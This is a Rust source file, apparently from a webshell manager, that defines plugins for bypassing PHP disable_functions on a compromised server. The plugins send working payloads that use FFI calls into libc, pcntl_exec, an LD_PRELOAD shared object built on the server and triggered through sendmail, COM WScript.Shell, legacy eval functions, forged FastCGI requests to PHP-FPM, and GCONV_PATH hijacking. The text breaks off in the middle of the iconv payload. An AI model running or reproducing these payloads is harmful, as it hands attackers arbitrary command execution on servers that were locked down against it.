//! Bypass Disable Functions 向量库：每个绕过方式独立插件，可手动选择测试。
//! 公共辅助：环境检测 / 命令执行结果包装 / PHP 载荷模板。

use base64::Engine;
use crate::domain::AppSettings;
use crate::plugin::{FeatureManifest, FeaturePlugin, ParamSpec};
use crate::protocol::{Protocol, ProtocolError, SessionState};

/// 命令输出文件（载荷内统一使用，避免多次生成）。
pub(crate) const BYPASS_OUT: &str = "/tmp/.dsw_bypass_out.txt";

/// 从参数取命令。
pub(crate) fn cmd_of(params: &serde_json::Value) -> String {
    params
        .get("command")
        .and_then(|v| v.as_str())
        .unwrap_or("id")
        .to_string()
}

/// 包装执行结果：成功 {ok, output(base64)}；失败 {ok, error}。
pub(crate) fn result_json(ok: bool, output: &str, error: &str) -> serde_json::Value {
    if ok {
        serde_json::json!({
            "ok": true,
            "output": base64::engine::general_purpose::STANDARD.encode(output.as_bytes()),
            "output_text": output,
        })
    } else {
        serde_json::json!({ "ok": false, "error": error })
    }
}

/// 执行 PHP 载荷并解析 JSON 结果。
pub(crate) fn run_payload(
    protocol: &dyn Protocol,
    session: &dyn SessionState,
    code: &str,
    settings: &AppSettings,
) -> Result<serde_json::Value, ProtocolError> {
    let output = protocol.run_code(session, "php", code, settings)?;
    serde_json::from_str(&output)
        .map_err(|_| ProtocolError::ParseError(format!("载荷输出非 JSON：{output}")))
}

/// 基础参数定义（command 必填）。
pub(crate) fn command_param(extra: Vec<ParamSpec>) -> Vec<ParamSpec> {
    let mut params = vec![ParamSpec {
        name: "command".into(),
        label: "要执行的命令".into(),
        param_type: "string".into(),
        default: Some(serde_json::json!("id")),
        options: None,
    }];
    params.extend(extra);
    params
}

/// 环境检测 PHP 载荷：禁用函数 + 各向量可用性评估。
pub(crate) const SCAN_PAYLOAD: &str = r#"<?php
error_reporting(0);
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
$disabled = array_values(array_filter($disabled, 'strlen'));
$has = function ($fn) use ($disabled) {
    return function_exists($fn) && !in_array($fn, $disabled);
};
$fns = array('shell_exec','exec','system','passthru','popen','proc_open','pcntl_exec','pcntl_fork','pcntl_waitpid','putenv','getenv','mail','error_log','dl','FFI','iconv','assert','create_function','preg_replace','stream_socket_client','fsockopen','curl_init','file_put_contents','pcntl_fork','popen','parse_str','apache_setenv');
$detected = array();
foreach ($fns as $fn) { $detected[$fn] = $has($fn); }
$compiler = null;
foreach (array('gcc','cc','clang') as $c) {
    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
    if (trim((string)$p)) { $compiler = trim($p); break; }
}
$sendmail = (string)ini_get('sendmail_path');
if ($sendmail === '') $sendmail = '/usr/sbin/sendmail';
$hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
// fpm socket 探测
$fpm = null;
$sockets = array('/var/run/php-fpm.sock','/var/run/php/php-fpm.sock','/run/php-fpm.sock','/run/php/php-fpm.sock','/var/run/php-fpm/php-fpm.sock');
foreach ($sockets as $s) { if (file_exists($s)) { $fpm = $s; break; } }
if (!$fpm) {
    $c = @fsockopen('127.0.0.1', 9000, $e1, $e2, 1);
    if ($c) { $fpm = '127.0.0.1:9000'; fclose($c); }
}
$vectors = array();
$vectors['syscall'] = $detected['exec'] || $detected['system'] || $detected['passthru'] || $detected['popen'] || $detected['proc_open'] || $detected['shell_exec'];
$vectors['pcntl'] = $detected['pcntl_exec'] && $detected['pcntl_fork'] && $detected['pcntl_waitpid'];
$vectors['ffi'] = PHP_VERSION_ID >= 70400 && $detected['FFI'];
$vectors['ld_preload'] = (bool)$compiler && $detected['putenv'] && ($detected['mail'] || $detected['error_log']) && $hasSendmail && ($detected['shell_exec'] || $detected['exec'] || $detected['system']);
$vectors['com'] = PHP_OS_FAMILY === 'Windows' && class_exists('COM');
$vectors['dl'] = $detected['dl'];
$vectors['eval_old'] = PHP_VERSION_ID < 80000 && ($detected['assert'] || $detected['create_function'] || $detected['preg_replace']);
$vectors['fastcgi'] = $fpm !== null;
$vectors['iconv_gconv'] = (bool)$compiler && $detected['iconv'] && PHP_VERSION_ID < 70300;
echo json_encode(array(
    'ok' => true,
    'php' => PHP_VERSION,
    'os' => php_uname('s'),
    'sapi' => php_sapi_name(),
    'disable_functions' => $disabled,
    'detected' => $detected,
    'compiler' => $compiler,
    'sendmail' => $hasSendmail ? $sendmail : null,
    'fpm_socket' => $fpm,
    'vectors' => $vectors,
));
"#;

/// Bypass 环境检测器：评估禁用函数与各绕过向量可用性。
pub struct BypassScanPlugin;

impl FeaturePlugin for BypassScanPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_scan".into(),
            name: "Bypass 环境检测".into(),
            version: "1.0.0".into(),
            description: "评估 disable_functions 环境：禁用清单 + 各绕过向量可用性（先跑这个再选向量）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![],
            kind: "feature".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        _params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported(format!(
                "Bypass 检测仅支持 php 运行时（当前 {runtime}）"
            )));
        }
        run_payload(protocol, session, SCAN_PAYLOAD, settings)
    }
}

/// 执行命令并读取输出文件的通用 PHP 模板片段。
pub(crate) fn read_out_tail() -> &'static str {
    r#"$o = file_exists($of) ? @file_get_contents($of) : '';
@unlink($of);
"#
}

// ---------------------------------------------------------------------------
// 向量 1：bypass_syscall —— 直接使用可用的命令执行函数
// ---------------------------------------------------------------------------

pub struct BypassSyscallPlugin;

impl FeaturePlugin for BypassSyscallPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_syscall".into(),
            name: "Bypass·直接系统调用".into(),
            version: "1.0.0".into(),
            description: "直接用可用的命令执行函数（exec/system/passthru/popen/proc_open/shell_exec 任一）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: command_param(vec![]),
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let cmd = cmd_of(params);
        let code = format!(
            r#"<?php
error_reporting(0);
$cmd = {cmd};
$of = "{out}";
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
$has = function ($fn) use ($disabled) {{ return function_exists($fn) && !in_array($fn, $disabled); }};
$done = false;
if ($has('exec')) {{ $lines = array(); exec($cmd . ' 2>&1', $lines); $o = implode("\n", $lines); $done = true; }}
elseif ($has('system')) {{ ob_start(); system($cmd . ' 2>&1'); $o = ob_get_clean(); $done = true; }}
elseif ($has('passthru')) {{ ob_start(); passthru($cmd . ' 2>&1'); $o = ob_get_clean(); $done = true; }}
elseif ($has('popen')) {{ $p = @popen($cmd . ' 2>&1', 'r'); $o = $p ? stream_get_contents($p) : ''; if ($p) pclose($p); $done = true; }}
elseif ($has('proc_open')) {{ $d = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w')); $p = @proc_open($cmd, $d, $pipes); if (is_resource($p)) {{ $o = stream_get_contents($pipes[1]); proc_close($p); $done = true; }} }}
elseif ($has('shell_exec')) {{ $o = (string)@shell_exec($cmd . ' 2>&1'); $done = true; }}
echo json_encode(array('ok' => $done, 'used' => $done ? 'available' : 'all disabled',
    'output' => $done ? base64_encode($o) : null,
    'output_text' => $done ? $o : null,
    'error' => $done ? null : '全部命令执行函数均被禁用'));
"#,
            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
            out = BYPASS_OUT,
        );
        run_payload(protocol, session, &code, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 2：bypass_ffi —— FFI 直接调用 libc（PHP 7.4+，无需编译器）
// ---------------------------------------------------------------------------

pub struct BypassFfiPlugin;

impl FeaturePlugin for BypassFfiPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_ffi".into(),
            name: "Bypass·FFI".into(),
            version: "1.0.0".into(),
            description: "FFI::cdef 加载 libc 调用 popen/system（PHP 7.4+ 且启用 FFI，无需编译器）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: command_param(vec![]),
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let cmd = cmd_of(params);
        let code = format!(
            r#"<?php
error_reporting(0);
$cmd = {cmd};
$of = "{out}";
$lib = null;
$ffi = null;
foreach (array('libc.so.6', 'libc.so', '/lib/x86_64-linux-gnu/libc.so.6', '/usr/lib/libc.dylib', 'msvcrt.dll') as $l) {{
    try {{ $ffi = FFI::cdef("FILE *popen(const char *, const char *); char *fgets(char *, int, FILE *); int pclose(FILE *); int system(const char *);", $l); $lib = $l; break; }}
    catch (Throwable $e) {{ continue; }}
}}
if ($lib === null) {{
    echo json_encode(array('ok' => false, 'error' => 'FFI 不可用或无法加载 libc（需 PHP 7.4+ 且 ffi.enable=1）'));
    exit;
}}
try {{
    $fp = $ffi->popen($cmd . ' 2>&1', 'r');
    if ($fp !== null) {{
        $output = '';
        $buf = $ffi->new("char[4096]");
        while ($ffi->fgets($buf, 4095, $fp) !== null) {{ $output .= FFI::string($buf); }}
        $ffi->pclose($fp);
        echo json_encode(array('ok' => true, 'lib' => $lib, 'method' => 'popen',
            'output' => base64_encode($output), 'output_text' => $output));
    }} else {{
        $ffi->system($cmd . ' > ' . $of . ' 2>&1');
        $output = file_exists($of) ? @file_get_contents($of) : '';
        @unlink($of);
        echo json_encode(array('ok' => true, 'lib' => $lib, 'method' => 'system',
            'output' => base64_encode($output), 'output_text' => $output));
    }}
}} catch (Throwable $e) {{
    echo json_encode(array('ok' => false, 'error' => $e->getMessage()));
}}
"#,
            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
            out = BYPASS_OUT,
        );
        run_payload(protocol, session, &code, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 3：bypass_pcntl —— pcntl_exec fork 子进程执行
// ---------------------------------------------------------------------------

pub struct BypassPcntlPlugin;

impl FeaturePlugin for BypassPcntlPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_pcntl".into(),
            name: "Bypass·pcntl_exec".into(),
            version: "1.0.0".into(),
            description: "pcntl_fork + pcntl_exec 在子进程执行命令（输出重定向读取）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: command_param(vec![]),
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let cmd = cmd_of(params);
        let code = format!(
            r#"<?php
error_reporting(0);
$cmd = {cmd};
$of = "{out}";
$ok = false;
if (function_exists('pcntl_fork') && function_exists('pcntl_exec') && function_exists('pcntl_waitpid')) {{
    $pid = pcntl_fork();
    if ($pid === 0) {{
        pcntl_exec('/bin/sh', array('-c', $cmd . ' > ' . $of . ' 2>&1'));
        exit;
    }}
    if ($pid > 0) {{
        pcntl_waitpid($pid, $status);
        $output = file_exists($of) ? @file_get_contents($of) : '';
        @unlink($of);
        $ok = true;
        echo json_encode(array('ok' => true, 'pid' => $pid,
            'output' => base64_encode((string)$output), 'output_text' => (string)$output));
        exit;
    }}
}}
echo json_encode(array('ok' => false, 'error' => 'pcntl_exec/pcntl_fork/pcntl_waitpid 不可用'));
"#,
            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
            out = BYPASS_OUT,
        );
        run_payload(protocol, session, &code, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 4：bypass_ld_preload —— LD_PRELOAD + mail/error_log 触发
// ---------------------------------------------------------------------------

const LD_PRELOAD_C: &str = r#"#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
__attribute__((constructor)) static void dsw_entry(void) {
    unsetenv("LD_PRELOAD");
    const char *c = getenv("EVIL_CMD");
    if (c) execl("/bin/sh", "sh", "-c", c, (char *)0);
}
"#;

pub struct BypassLdPreloadPlugin;

impl FeaturePlugin for BypassLdPreloadPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_ld_preload".into(),
            name: "Bypass·LD_PRELOAD".into(),
            version: "1.0.0".into(),
            description: "现场编译 .so（需 gcc）+ putenv LD_PRELOAD + mail/error_log 触发 sendmail 执行。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: command_param(vec![ParamSpec {
                name: "trigger".into(),
                label: "触发点".into(),
                param_type: "select".into(),
                default: Some(serde_json::json!("auto")),
                options: Some(vec!["auto".into(), "mail".into(), "error_log".into()]),
            }]),
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let cmd = cmd_of(params);
        let trigger = params
            .get("trigger")
            .and_then(|v| v.as_str())
            .unwrap_or("auto");
        let trigger_php = match trigger {
            "mail" => "if (function_exists('mail')) { @mail('a@b.c', '', ''); }",
            "error_log" => "if (function_exists('error_log')) { @error_log('', 1); }",
            _ => "if (function_exists('mail')) { @mail('a@b.c', '', ''); } else { @error_log('', 1); }",
        };
        let code = format!(
            r#"<?php
error_reporting(0);
$cmd = {cmd};
$of = "{out}";
$tmp = sys_get_temp_dir();
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
$has = function ($fn) use ($disabled) {{ return function_exists($fn) && !in_array($fn, $disabled); }};
$cc = null;
foreach (array('gcc', 'cc', 'clang') as $c) {{
    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
    if (trim((string)$p)) {{ $cc = trim($p); break; }}
}}
$sendmail = (string)ini_get('sendmail_path');
if ($sendmail === '') $sendmail = '/usr/sbin/sendmail';
$hasSendmail = @is_executable($sendmail) || @file_exists($sendmail);
if (!$cc || !$has('putenv') || !($has('mail') || $has('error_log')) || !$hasSendmail) {{
    echo json_encode(array('ok' => false,
        'error' => '缺少条件：编译器(' . ($cc ?: '无') . ') putenv(' . ($has('putenv') ? '有' : '无') . ') sendmail(' . ($hasSendmail ? '有' : '无') . ')'));
    exit;
}}
$so = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.so';
$cf = $tmp . '/.dsw_' . mt_rand() . '_' . mt_rand() . '.c';
$c = <<<'C'
__C__
C;
@file_put_contents($cf, $c);
$built = @shell_exec($cc . ' -shared -fPIC -O2 -o ' . $so . ' ' . $cf . ' 2>&1');
if (!file_exists($so)) {{
    echo json_encode(array('ok' => false, 'error' => '编译失败：' . (string)$built));
    exit;
}}
@putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
@putenv('LD_PRELOAD=' . $so);
{trigger}
@putenv('LD_PRELOAD=');
usleep(300000);
$output = file_exists($of) ? @file_get_contents($of) : '';
@unlink($of); @unlink($so); @unlink($cf);
echo json_encode(array('ok' => true,
    'output' => base64_encode((string)$output), 'output_text' => (string)$output,
    'compiler' => $cc, 'sendmail' => $sendmail));
"#,
            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
            out = BYPASS_OUT,
            trigger = trigger_php,
        )
        .replace("__C__", LD_PRELOAD_C);
        run_payload(protocol, session, &code, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 5：bypass_com —— Windows COM/.NET
// ---------------------------------------------------------------------------

pub struct BypassComPlugin;

impl FeaturePlugin for BypassComPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_com".into(),
            name: "Bypass·COM(Windows)".into(),
            version: "1.0.0".into(),
            description: "Windows 下用 COM 组件 WScript.Shell 执行命令（php.ini 需启用 com.allow_dcom）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: command_param(vec![]),
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let cmd = cmd_of(params);
        let code = format!(
            r#"<?php
error_reporting(0);
$cmd = {cmd};
$of = "{out}";
if (PHP_OS_FAMILY !== 'Windows' || !class_exists('COM')) {{
    echo json_encode(array('ok' => false, 'error' => '需 Windows + PHP COM 扩展'));
    exit;
}}
try {{
    $wsh = new COM('WScript.Shell');
    $wsh->Run('cmd /c "' . $cmd . '" > ' . $of . ' 2>&1', 0, true);
    $output = file_exists($of) ? @file_get_contents($of) : '';
    @unlink($of);
    echo json_encode(array('ok' => true,
        'output' => base64_encode((string)$output), 'output_text' => (string)$output));
}} catch (Throwable $e) {{
    echo json_encode(array('ok' => false, 'error' => $e->getMessage()));
}}
"#,
            cmd = serde_json::to_string(&cmd).unwrap_or_else(|_| "\"id\"".to_string()),
            out = BYPASS_OUT,
        );
        run_payload(protocol, session, &code, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 6：bypass_eval —— 老版本 eval 替代（assert / create_function / preg_replace-e）
// ---------------------------------------------------------------------------

pub struct BypassEvalPlugin;

impl FeaturePlugin for BypassEvalPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_eval".into(),
            name: "Bypass·老版本 eval".into(),
            version: "1.0.0".into(),
            description: "PHP 5.x/7.x 利用 assert / create_function / preg_replace /e 执行任意代码（被禁时）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![ParamSpec {
                name: "code".into(),
                label: "PHP 代码".into(),
                param_type: "string".into(),
                default: Some(serde_json::json!("echo 'eval-ok';")),
                options: None,
            }],
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let code = params
            .get("code")
            .and_then(|v| v.as_str())
            .unwrap_or("echo 'eval-ok';")
            .to_string();
        let payload = format!(
            r#"<?php
error_reporting(0);
$code = {code};
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
$has = function ($fn) use ($disabled) {{ return function_exists($fn) && !in_array($fn, $disabled); }};
$result = null;
$method = null;
if (PHP_VERSION_ID < 80000 && $has('assert')) {{
    $method = 'assert';
    $result = @assert($code);
}} elseif (PHP_VERSION_ID < 80000 && $has('create_function')) {{
    $method = 'create_function';
    $f = @create_function('', $code);
    if ($f) {{ ob_start(); @$f(); $result = ob_get_clean(); }}
}} elseif (PHP_VERSION_ID < 50500 && $has('preg_replace')) {{
    $method = 'preg_replace-e';
    $result = @preg_replace('/.*/e', $code, 'x');
}}
echo json_encode(array('ok' => $result !== null && $result !== false,
    'method' => $method, 'output' => base64_encode((string)$result), 'output_text' => (string)$result,
    'error' => $method === null ? '无可用老版本 eval 函数（assert/create_function/preg-e）' : null));
"#,
            code = serde_json::to_string(&code).unwrap_or_else(|_| "\"echo 'x';\"".to_string()),
        );
        run_payload(protocol, session, &payload, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 7：bypass_dl —— dl() 动态加载扩展
// ---------------------------------------------------------------------------

pub struct BypassDlPlugin;

impl FeaturePlugin for BypassDlPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_dl".into(),
            name: "Bypass·dl 动态加载".into(),
            version: "1.0.0".into(),
            description: "dl() 动态加载预编译扩展（需已存在 .so 路径；现代 PHP 多数环境已禁 dl）。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![ParamSpec {
                name: "extension".into(),
                label: "扩展 .so 路径".into(),
                param_type: "string".into(),
                default: Some(serde_json::json!("")),
                options: None,
            }],
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let extension = params
            .get("extension")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let code = format!(
            r#"<?php
error_reporting(0);
$ext = {ext};
if (!function_exists('dl')) {{
    echo json_encode(array('ok' => false, 'error' => 'dl() 不存在（现代 PHP 仅 CLI/embed 可用）'));
    exit;
}}
if ($ext === '') {{
    echo json_encode(array('ok' => false, 'error' => '请填写扩展 .so 路径（如 /usr/lib/php/xxx.so）'));
    exit;
}}
$ok = @dl($ext);
echo json_encode(array('ok' => $ok, 'extension' => $ext,
    'error' => $ok ? null : 'dl() 加载失败（路径无效或环境禁用）'));
"#,
            ext = serde_json::to_string(&extension).unwrap_or_else(|_| "\"\"".to_string()),
        );
        run_payload(protocol, session, &code, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 8：bypass_fastcgi —— PHP-FPM 未授权 socket（FCGI 协议伪造请求）
// ---------------------------------------------------------------------------

pub struct BypassFastcgiPlugin;

impl FeaturePlugin for BypassFastcgiPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_fastcgi".into(),
            name: "Bypass·FPM 未授权".into(),
            version: "1.0.0".into(),
            description: "探测 php-fpm unix socket/9000 端口，伪造 FCGI 请求（auto_prepend_file）执行代码。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: vec![
                ParamSpec {
                    name: "socket".into(),
                    label: "FPM Socket（留空自动探测）".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("")),
                    options: None,
                },
                ParamSpec {
                    name: "code".into(),
                    label: "PHP 代码".into(),
                    param_type: "string".into(),
                    default: Some(serde_json::json!("system('id');")),
                    options: None,
                },
            ],
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let socket = params
            .get("socket")
            .and_then(|v| v.as_str())
            .unwrap_or("")
            .to_string();
        let code = params
            .get("code")
            .and_then(|v| v.as_str())
            .unwrap_or("system('id');")
            .to_string();
        let payload = format!(
            r#"<?php
error_reporting(0);
$code = {code};
$target = {socket};
$sockets = array(
    '/var/run/php-fpm.sock', '/var/run/php/php-fpm.sock', '/run/php-fpm.sock',
    '/run/php/php-fpm.sock', '/var/run/php-fpm/php-fpm.sock', '127.0.0.1:9000', '127.0.0.1:9001',
);
if ($target !== '') array_unshift($sockets, $target);
$found = null;
foreach ($sockets as $s) {{
    $fp = @stream_socket_client(strpos($s, ':') !== false ? 'tcp://' . $s : 'unix://' . $s, $e1, $e2, 2);
    if ($fp) {{ $found = $s; break; }}
}}
if ($found === null) {{
    echo json_encode(array('ok' => false, 'error' => '未发现可连接的 FPM socket/端口'));
    exit;
}}
// FCGI 协议
function fcgi_pack($type, $content, $reqid = 1) {{
    $hdr = chr(1) . chr($type) . chr(($reqid >> 8) & 0xFF) . chr($reqid & 0xFF)
        . chr((strlen($content) >> 8) & 0xFF) . chr(strlen($content) & 0xFF)
        . chr(0) . chr(0);
    return $hdr . $content;
}}
function fcgi_param($key, $val) {{
    $len = function ($n) {{ if ($n < 128) return chr($n); return chr(($n >> 24) & 0xFF) . chr(($n >> 16) & 0xFF) . chr(($n >> 8) & 0xFF) . chr($n & 0xFF); }};
    return $len(strlen($key)) . $len(strlen($val)) . $key . $val;
}}
$body = "<?php " . $code . " ?>";
$params = '';
$params .= fcgi_param('GATEWAY_INTERFACE', 'CGI/1.1');
$params .= fcgi_param('REQUEST_METHOD', 'POST');
$params .= fcgi_param('SCRIPT_FILENAME', '/tmp/.dsw_fcgi_target.php');
$params .= fcgi_param('SCRIPT_NAME', '/.dsw_fcgi_target.php');
$params .= fcgi_param('DOCUMENT_ROOT', '/tmp');
$params .= fcgi_param('SERVER_SOFTWARE', 'dosword');
$params .= fcgi_param('REMOTE_ADDR', '127.0.0.1');
$params .= fcgi_param('REMOTE_PORT', '12345');
$params .= fcgi_param('SERVER_ADDR', '127.0.0.1');
$params .= fcgi_param('SERVER_PORT', '80');
$params .= fcgi_param('SERVER_NAME', 'localhost');
$params .= fcgi_param('SERVER_PROTOCOL', 'HTTP/1.1');
$params .= fcgi_param('CONTENT_TYPE', 'application/x-www-form-urlencoded');
$params .= fcgi_param('CONTENT_LENGTH', (string)strlen($body));
$params .= fcgi_param('PHP_VALUE', 'auto_prepend_file = php://input');
$params .= fcgi_param('PHP_ADMIN_VALUE', 'allow_url_include = On');
$fp = @stream_socket_client(strpos($found, ':') !== false ? 'tcp://' . $found : 'unix://' . $found, $e1, $e2, 3);
if (!$fp) {{ echo json_encode(array('ok' => false, 'error' => '连接失败')); exit; }}
$req = fcgi_pack(1, chr(0) . chr(1) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0) . chr(0));
$req .= fcgi_pack(4, $params, 1);
$req .= fcgi_pack(5, $body, 1);
fwrite($fp, $req);
stream_set_timeout($fp, 3);
$resp = '';
while (!feof($fp)) {{
    $chunk = fread($fp, 8192);
    if ($chunk === false || $chunk === '') break;
    $resp .= $chunk;
    if (strpos($resp, "\r\n\r\n") !== false && strlen($resp) > 200) break;
}}
fclose($fp);
// 提取响应体
$out = '';
if (preg_match('/\r\n\r\n(.*)$/s', $resp, $m)) {{ $out = $m[1]; }}
echo json_encode(array('ok' => strlen($out) > 0, 'target' => $found,
    'output' => base64_encode($out), 'output_text' => $out,
    'error' => strlen($out) === 0 ? 'FPM 无响应（可能未授权或配置拒绝）' : null));
"#,
            code = serde_json::to_string(&code).unwrap_or_else(|_| "\"system('id');\"".to_string()),
            socket = serde_json::to_string(&socket).unwrap_or_else(|_| "\"\"".to_string()),
        );
        run_payload(protocol, session, &payload, settings)
    }
}

// ---------------------------------------------------------------------------
// 向量 9：bypass_iconv —— GCONV_PATH 劫持（PHP 7.0-7.2，需编译器）
// ---------------------------------------------------------------------------

const ICONV_GADGET_C: &str = r#"#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <iconv.h>
void gconv(void) {}
void gconv_init(void) {
    unsetenv("GCONV_PATH");
    unsetenv("CHARSET");
    const char *c = getenv("EVIL_CMD");
    if (c) execl("/bin/sh", "sh", "-c", c, (char *)0);
}
"#;

pub struct BypassIconvPlugin;

impl FeaturePlugin for BypassIconvPlugin {
    fn manifest(&self) -> FeatureManifest {
        FeatureManifest {
            id: "bypass_iconv".into(),
            name: "Bypass·GCONV_PATH".into(),
            version: "1.0.0".into(),
            description: "PHP 7.0-7.2 iconv 劫持：编译 gconv 模块 .so，GCONV_PATH 环境注入触发执行。".into(),
            category: "php".into(),
            languages: vec!["php".into()],
            params: command_param(vec![]),
            kind: "loader".into(),
        }
    }

    fn execute(
        &self,
        protocol: &dyn Protocol,
        session: &dyn SessionState,
        runtime: &str,
        params: &serde_json::Value,
        settings: &AppSettings,
    ) -> Result<serde_json::Value, ProtocolError> {
        if runtime != "php" {
            return Err(ProtocolError::NotSupported("仅支持 php".into()));
        }
        let cmd = cmd_of(params);
        let code = format!(
            r#"<?php
error_reporting(0);
$cmd = {cmd};
$of = "{out}";
if (PHP_VERSION_ID >= 70300) {{
    echo json_encode(array('ok' => false, 'error' => '该向量针对 PHP 7.0-7.2（当前 ' . PHP_VERSION . '）'));
    exit;
}}
$disabled = array_map('trim', explode(',', (string)ini_get('disable_functions')));
$has = function ($fn) use ($disabled) {{ return function_exists($fn) && !in_array($fn, $disabled); }};
$cc = null;
foreach (array('gcc', 'cc', 'clang') as $c) {{
    $p = @shell_exec('command -v ' . $c . ' 2>/dev/null');
    if (trim((string)$p)) {{ $cc = trim($p); break; }}
}}
if (!$cc || !$has('iconv') || !$has('putenv')) {{
    echo json_encode(array('ok' => false, 'error' => '缺少条件：编译器/iconv/putenv'));
    exit;
}}
$base = sys_get_temp_dir() . '/.dsw_gc_' . mt_rand();
@mkdir($base);
$gconvDir = $base . '/gconv';
@mkdir($gconvDir);
$cf = $base . '/gconv-modules';
$so = $gconvDir . '/gconv-modules.so';
$src = $base . '/g.c';
$g = <<<'C'
__C__
C;
@file_put_contents($src, $g);
$built = @shell_exec($cc . ' -shared -fPIC -o ' . $so . ' ' . $src . ' 2>&1');
if (!file_exists($so)) {{
    echo json_encode(array('ok' => false, 'error' => '编译失败：' . (string)$built));
    exit;
}}
$mod = "module PAYLOAD// INTERNAL ../gconv/gconv-modules.so 2\n";
$alias = "alias PAYLOAD// X11//\n";
@file_put_contents($cf, $mod . $alias);
@putenv('EVIL_CMD=' . $cmd . ' > ' . $of . ' 2>&1');
@putenv('GCONV_PATH=' . $base);
$r = @iconv('PAYLOAD//', 'UTF-8', 'x');
@putenv('GCONV_PATH=');
@putenv('EVIL_CMD=');
usleep(300000);
